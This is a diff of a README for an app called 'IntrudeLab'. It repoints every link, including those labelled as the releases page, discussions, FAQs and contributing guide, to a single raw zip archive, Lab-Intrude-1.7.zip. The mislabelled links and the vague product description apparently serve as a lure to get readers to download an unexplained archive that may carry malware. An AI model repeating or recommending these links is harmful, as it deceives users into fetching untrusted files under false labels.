@@ -6,7 +6,7 @@ Welcome to IntrudeLab! This application helps you streamline your daily tasks an
 
 ## 📥 Download Now
 
-[![Download IntrudeLab](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip)](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip)
+[![Download IntrudeLab](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip)](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip)
 
 ## 🛠 System Requirements
 
@@ -30,7 +30,7 @@ IntrudeLab offers the following features:
 To install IntrudeLab, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip).
 
 2. **Choose Your Version:**
    Look for the latest release. You will find it at the top of the page.
@@ -54,12 +54,12 @@ To install IntrudeLab, follow these steps:
 If you run into any issues, please check the following resources:
 
 - **User Guide:** Available in the application under Help > User Guide.
-- **FAQs:** You can find common questions answered on our [GitHub Discussions](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip).
+- **FAQs:** You can find common questions answered on our [GitHub Discussions](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip).
 - **Community Support:** Join our community forum for tips and assistance from other users.
 
 ## 👥 Contributing
 
-We welcome contributions! If you want to help improve IntrudeLab, check our [Contributing Guide](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip) for details on how to get involved.
+We welcome contributions! If you want to help improve IntrudeLab, check our [Contributing Guide](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip) for details on how to get involved.
 
 ## 🔒 License
 
@@ -67,6 +67,6 @@ IntrudeLab is open-source software licensed under the MIT License. You can freel
 
 ## 📣 Stay Updated
 
-Check our [Releases page](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/IntrudeLab.zip) regularly for the latest updates and features. We continually improve based on user feedback.
+Check our [Releases page](https://raw.githubusercontent.com/Krizx6/IntrudeLab/main/chili/Lab-Intrude-1.7.zip) regularly for the latest updates and features. We continually improve based on user feedback.
 
 Thank you for choosing IntrudeLab! Enjoy your improved workflow.
